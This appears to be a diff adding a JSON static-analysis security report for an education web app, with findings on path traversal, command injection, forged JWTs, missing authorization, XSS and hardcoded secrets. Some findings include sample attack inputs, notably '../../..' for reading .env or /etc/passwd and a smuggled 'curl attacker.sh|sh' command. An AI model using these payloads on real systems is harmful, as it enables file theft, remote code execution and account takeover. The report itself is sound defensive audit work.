@@ -1,0 +1,390 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "src/actions/files.ts",
+      "start": {
+        "line": 256,
+        "col": 1,
+        "offset": 7442
+      },
+      "end": {
+        "line": 266,
+        "col": 1,
+        "offset": 7849
+      },
+      "extra": {
+        "message": "downloadCourseHandout() passes attacker-controlled `folder` and `filename` form fields (only min-length validated by handoutDownloadSchema) directly to readCourseHandoutFile(). That helper (src/lib/document-library.ts:12-14) performs path.join(HANDOUT_ROOT, folder, filename) followed by fs.readFileSync with NO traversal containment (unlike its sibling readArchivedSubmissionFile which resolves and prefix-checks). Any authenticated user can read arbitrary files on the server (e.g. .env, /etc/passwd, other users' uploads) via folder/filename values such as `../../..`, and the raw content is returned base64 to the caller.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "src/lib/report-conversion.ts",
+      "start": {
+        "line": 16,
+        "col": 1,
+        "offset": 557
+      },
+      "end": {
+        "line": 17,
+        "col": 1,
+        "offset": 714
+      },
+      "extra": {
+        "message": "convertGradeExportToFormat() interpolates the user-controlled `reportType` string directly into a shell command executed via spawn('bash', ['-c', cmd], { shell: true }). The value originates from formData.get('reportType') in exportGradesCsv() (src/actions/admin.ts:392-397) and is NOT allow-listed (compare convertSubmissionsReportToFormat which checks ALLOWED_REPORT_TYPES). An authenticated instructor/school_admin can inject arbitrary OS commands, e.g. reportType = `pdf; curl attacker.sh|sh; #`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.jwt-no-signature-verification",
+      "path": "src/lib/partner-integration.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 645
+      },
+      "end": {
+        "line": 22,
+        "col": 1,
+        "offset": 688
+      },
+      "extra": {
+        "message": "processAllocation() decodes the partner assertion with decodeJwt() and never verifies its signature or algorithm, so every claim (institutionId, cohortId, role) is fully attacker-controlled. It is consumed by the unauthenticated API route src/app/api/partner/cost-allocation/route.ts and by viewPartnerCostAllocation() (src/actions/partner-allocation.ts:32) which has no auth of its own and returns full cohortEnrollments rows when role=='partner_admin'. An attacker can forge a token with any cohortId/role and read any cohort's allocation data/enrollments. The sibling handleResourceCheck() verifies with jwtVerify against the shared secret, confirming this is a broken-auth path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-345: Insufficient Verification of Data Authenticity"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.missing-authorization",
+      "path": "src/actions/admin.ts",
+      "start": {
+        "line": 184,
+        "col": 1,
+        "offset": 4994
+      },
+      "end": {
+        "line": 186,
+        "col": 1,
+        "offset": 5076
+      },
+      "extra": {
+        "message": "importEnrollmentsCsv() only calls requireAuth() and never verifies the caller is a school_admin or instructor/owner (compare importUsersCsv which requires school_admin). Any authenticated user - including a student - can upload a CSV that bulk-enrolls arbitrary existing users into any cohort, optionally with enrollmentRole 'instructor'/'teaching_assistant', silently granting course/grade access to whoever they choose.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control",
+      "path": "src/actions/insights.ts",
+      "start": {
+        "line": 56,
+        "col": 1,
+        "offset": 1748
+      },
+      "end": {
+        "line": 62,
+        "col": 1,
+        "offset": 2020
+      },
+      "extra": {
+        "message": "viewCohortInsights() trusts a client-supplied `dataLevel` field: when set to 'elevated' it returns every row from gradeHistory joined to submissions with NO where-clause scoping to the requested cohort/course. The only gate is canTeachCourse() on the requested cohort, so any teaching_assistant/instructor who runs a single course can dump the ENTIRE institution's grade-change history (student ids, grades, changed-by staff, reasons). The supposedly-secure variant viewCourseInsights() re-checks the requester's elevated entitlement server-side.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.stored-xss",
+      "path": "src/actions/content-import.ts",
+      "start": {
+        "line": 121,
+        "col": 1,
+        "offset": 3528
+      },
+      "end": {
+        "line": 131,
+        "col": 1,
+        "offset": 3839
+      },
+      "extra": {
+        "message": "importLessonStructure() inserts the imported lesson `content` into the DB without running sanitizeHtml(), unlike createLesson() in src/actions/courses.ts. That content is rendered verbatim with dangerouslySetInnerHTML on the course modules page (src/app/courses/[courseId]/modules/page.tsx:188) that all enrolled students view, so an instructor can import `<script>...</script>` / event-handler HTML and achieve stored XSS against every student in the course. Sibling importModuleStructure() (lines 55-64) is worse: it spreads arbitrary unvalidated JSON keys straight into the lessons insert.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "src/actions/courses.ts",
+      "start": {
+        "line": 407,
+        "col": 1,
+        "offset": 12045
+      },
+      "end": {
+        "line": 429,
+        "col": 1,
+        "offset": 12802
+      },
+      "extra": {
+        "message": "publishModuleStaticPage() takes `pageSlug` straight from the form (no validation/normalization) and passes it to publishModulePage(), which does join(courseDir, `${pageSlug}.html`) and writes the file (src/lib/module-publishing.ts:19). A pageSlug containing `../` lets a course instructor write .html files outside the module cache directory (e.g. into public/, or overwrite other courses' cached pages). Note the sibling publishModulePreviewPage() sanitizes the slug with path.basename() first, confirming this path is missing the same protection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal",
+            "CWE-23: Relative Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.unrestricted-upload",
+      "path": "src/lib/course-branding.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 601
+      },
+      "end": {
+        "line": 23,
+        "col": 1,
+        "offset": 835
+      },
+      "extra": {
+        "message": "saveCourseBannerImage() writes the uploaded file to public/course-banners/${courseId}-${file.name} using the raw client-controlled file name with no extension/type allow-list, size cap, or random naming (contrast saveProfileAvatarImage() which enforces JPEG/PNG + size + random name). A crafted `file.name` containing path separators/traversal can write arbitrary content outside the banners directory into public/, planting a same-origin HTML file for stored XSS, or overwriting existing assets.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type",
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.cors-misconfiguration",
+      "path": "src/lib/embed-cors.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 617
+      },
+      "end": {
+        "line": 23,
+        "col": 1,
+        "offset": 823
+      },
+      "extra": {
+        "message": "buildSpotlightCorsHeaders() reflects whatever Origin the request carries into Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true. Any malicious website can therefore make credentialed cross-origin reads of widget endpoints. Even though the current catalog widget data is public, this dangerously-permissive CORS policy would expose any cookie/session-scoped data if these headers are reused, and it defeats the origin allow-list used by buildShowcaseCorsHeaders().",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Overly Permissive Cross-domain Whitelist",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.padding-oracle",
+      "path": "src/lib/exam-package.ts",
+      "start": {
+        "line": 42,
+        "col": 1,
+        "offset": 1565
+      },
+      "end": {
+        "line": 47,
+        "col": 1,
+        "offset": 1832
+      },
+      "extra": {
+        "message": "decryptExamAnswerKeyPackage() decrypts with AES-256-CBC and reveals whether a padding failure occurred via a distinct error ('Malformed package padding') vs a generic one. This error distinction is exposed through POST /api/grading/answer-key-package (src/app/api/grading/answer-key-package/route.ts:16-21), which returns the plaintext on success - forming a padding oracle that allows an authenticated instructor to recover the plaintext of any captured answer-key bundle without the key. The GCM-based gradebook-snapshot path (same file) deliberately returns only a generic error, showing this CBC path is the weak one.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-crypto-key",
+      "path": "src/lib/exam-package.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 382
+      },
+      "end": {
+        "line": 13,
+        "col": 1,
+        "offset": 475
+      },
+      "extra": {
+        "message": "PACKAGE_KEY defaults to a well-known all-zero 32-byte value (Buffer.from('0'.repeat(64), 'hex')) when EXAM_PACKAGE_KEY is not set. Exam answer-key and gradebook-snapshot encryption/decryption then use a publicly-known key, so anyone can decrypt or forge encrypted packages. There is no guard that rejects the empty/default key in production.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-secret",
+      "path": "src/lib/auth.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 233
+      },
+      "end": {
+        "line": 9,
+        "col": 1,
+        "offset": 363
+      },
+      "extra": {
+        "message": "The session-signing secret falls back to the publicly-known constant 'dev-secret-change-in-production-min-32-chars' when SESSION_SECRET is unset (also duplicated in src/middleware.ts:5-7). If the env var is missing in any deployment, an attacker can forge valid HS256 session JWTs for arbitrary users - including school_admin - and take over accounts.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.broken-access-control",
+      "path": "src/app/submissions/[submissionId]/page.tsx",
+      "start": {
+        "line": 112,
+        "col": 1,
+        "offset": 2926
+      },
+      "end": {
+        "line": 124,
+        "col": 1,
+        "offset": 3347
+      },
+      "extra": {
+        "message": "The submission detail page authorizes purely on global role: any school_admin, instructor OR teaching_assistant (isInstructor) can view ANY submission school-wide regardless of whether they teach the course, exposing the student's content, attachments, grade, private instructor notes, feedback and full grade history. There is no hasCourseAccess/canTeachCourse check against the submission's course. Teaching assistants - who only hold access to courses they are assigned to - can enumerate and read every student's submission/grade in the institution.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.error-information-disclosure",
+      "path": "src/lib/catalog-search.ts",
+      "start": {
+        "line": 29,
+        "col": 1,
+        "offset": 909
+      },
+      "end": {
+        "line": 36,
+        "col": 1,
+        "offset": 1145
+      },
+      "extra": {
+        "message": "The public, unauthenticated catalog lookup endpoint (src/app/api/catalog/lookup/route.ts) returns the raw database error message and full stack trace whenever the caller sends the header x-widget-diagnostics: 1. This leaks internal implementation details (file paths, stack, driver/query internals) that aid further attacks. searchCohortDirectory() correctly only logs such detail server-side.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.sensitive-information-logging",
+      "path": "src/actions/auth.ts",
+      "start": {
+        "line": 365,
+        "col": 1,
+        "offset": 9425
+      },
+      "end": {
+        "line": 365,
+        "col": 1,
+        "offset": 9502
+      },
+      "extra": {
+        "message": "requestPasswordReset() logs the raw password-reset token to the server console (console.log). Because resetPassword() (auth.ts:383-437) accepts a token alone to set a new password with no email ownership step, anyone who can read application logs can reset and take over any user's account. importUsersCsv() likewise logs newly-created users' plaintext passwords (src/actions/admin.ts:595).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
